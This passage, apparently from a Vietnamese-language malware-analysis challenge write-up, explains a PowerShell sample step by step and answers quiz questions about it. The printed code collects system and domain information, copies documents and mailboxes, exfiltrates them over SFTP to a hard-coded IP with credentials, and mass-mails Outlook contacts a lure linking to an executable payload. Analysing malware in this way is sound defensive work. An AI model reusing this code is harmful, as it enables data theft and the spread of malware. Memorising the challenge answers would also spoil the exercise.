if (-not (Test-Path -Path $targetDir -PathType Container)) {
    New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
}
```
- Tại đây kiểm tra xem có đường dẫn nào là `C:\Users\Public\Public Files` được tạo không, nếu không thì tạo
```
$currentUser | Out-File -FilePath (Join-Path $targetDir 'username.txt') -Force

nltest /dsgetdc:$env:USERDOMAIN 2>$null | Out-File -FilePath (Join-Path $targetDir 'DCinfo.txt') -Force
Get-WmiObject -Class Win32_UserAccount | Out-File -FilePath (Join-Path $targetDir 'localusers.txt') -Force
wmic /NAMESPACE:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value 2>$null | Out-File -FilePath (Join-Path $targetDir 'AVinfo.txt') -Force
```
- Tiếp sau đó là ghi các tệp `username.txt`, `localusers.txt`, `AVinfo.txt` vào đường dẫn đó
```
$extList =  "*.doc", "*.docx", "*.xls", "*.xlsx", "*.ppt", "*.pptx", "*.pdf", "*.csv", ".*oft", "*.potx", 
            "*.xltx", "*.dotx", "*.msg", "*.eml", "*.pst",  "*.odt", "*.ods", "*.odp", "*.odg", "*.ost"
             
$null = Get-ChildItem $searchDir -Recurse -Include $extList -Force -ErrorAction 'SilentlyContinue' |
    ForEach-Object {
        $destinationPath = Join-Path $targetDir $_.Name
        
        if ($_.FullName -ne $destinationPath) {
            Copy-Item -Path $_.FullName -Destination $destinationPath -Force
        }
    }
Compress-Archive -Path $targetDir -DestinationPath $archivePath -Force 
```
- Tìm tất cả các file có liên quan, sau đó nén lại
```
$wZipUrl = "https://us.softradar.com/static/products/winscp-portable/distr/0/winscp-portable_softradar-com.zip"
$wZipFile = "$targetDir\WinSCP.zip"
$wExtractPath = "C:\Users\Public\HelpDesk-Tools"

Invoke-WebRequest -UserAgent "Wget" -Uri $wZipUrl -OutFile $wZipFile -UseBasicParsing
Expand-Archive -Path $wZipFile -DestinationPath $wExtractPath -Force

$wExePath = "$wExtractPath\WinSCP.com"
$sPath = "$wExtractPath\maintenanceScript.txt"
@"
open sftp://service:M8&C!i6KkmGL1-#@35.169.66.138/ -hostkey=*
put `"$archivePath`"
close
exit
"@ | Out-File -FilePath $sPath -Force
Start-Process -FilePath $wExePath -ArgumentList "/script=`"$sPath`"" -Wait -NoNewWindow
```
- Tải và config WinSCP để gửi dữ liệu đi
```
$outlookPath  = Get-ChildItem -Path "C:\Program Files\Microsoft Office" -Filter "OUTLOOK.EXE" -Recurse | Select-Object -First 1 -ExpandProperty FullName

$htmlBody = @"
<!DOCTYPE html>
<html>
<head>
<style>
    body {
    font-family: Calibri, sans-serif;
    }
</style>
</head>
<body>
<p>Hey, </p> <p> Hope you're doing great when you see this. I'm reaching out because there's something I've been wanting to share with you. You know that feeling when you've been adm
iring someone from afar, but hesitated to take the next step? That's been me lately, but I've decided it's time to change that.</p>
<p>In a world where we often rush through everything, I believe in the beauty of taking things slow, cherishing each moment like a scene from a timeless tale. So, if you're open to i
t, I'd love for us to meet up after hours.</p>
<p>I've arranged for a rendezvous at a private membership club, where we can enjoy a bit of privacy and exclusivity. I've attached the map for your convenience. </p>
<p>To gain entry, you'll need a digital membership card for entry, accessible <a href='http://44.206.187.144:9000/Superstar_MemberCard.tiff.exe'>here</a>. Just a friendly heads up, t
here's a time limit before you can download it, so it's best to grab it sooner rather than waiting too long.</p>
<p>Counting on seeing you there later.</p>
</body>
</html>
"@

if ($outlookPath) {
    Start-Process -FilePath $outlookPath
    $outlook = New-Object -ComObject Outlook.Application
    $namespace = $outlook.GetNamespace("MAPI")
    $contactsFolder = $namespace.GetDefaultFolder(10) 
    $csvFilePath = "$targetDir\Contacts.csv"
    $contactsFolder.Items | ForEach-Object {
        $_.GetInspector | ForEach-Object {
            $_.Close(0)  
        }
        $props = @{
            'Full Name'      = $_.FullName
            'Email Address'  = $_.Email1Address
            
        }
        New-Object PSObject -Property $props
    } | Export-Csv -Path $csvFilePath -NoTypeInformation

    $contacts = Import-Csv -Path $csvFilePath
    $mailItem = $outlook.CreateItem(0)
    $mailItem.Subject = "Fingers crossed you'll notice.."
    $mailItem.HtmlBody = $htmlBody
    $mailItem.Attachments.Add($img) > $null
    $mailItem.BodyFormat = 2 

    foreach ($contact in $contacts) {
        $bccRecipient = $mailItem.Recipients.Add($contact."Email Address")
        $bccRecipient.Type = [Microsoft.Office.Interop.Outlook.OlMailRecipientType]::olBCC
    }

    $mailItem.Recipients.ResolveAll() > $null
    $mailItem.Send()
}
```
- Và cuối cùng là, gửi thông qua email để lây nhiễm cho nhiều người khác.

> C:\Users\Public\Public Files

#### What MITRE ID corresponds to the technique used by the malicious binary to autonomously gather data?
> T1119

#### What is the password utilized to exfiltrate the collected files through the file transfer program within the binary?
- `file transfer program` được nhắc đến ở đây khả năng cao là `WinSCP`, `open sftp://service:M8&C!i6KkmGL1-#@35.169.66.138/ -hostkey=*`

> M8&C!i6KkmGL1-#
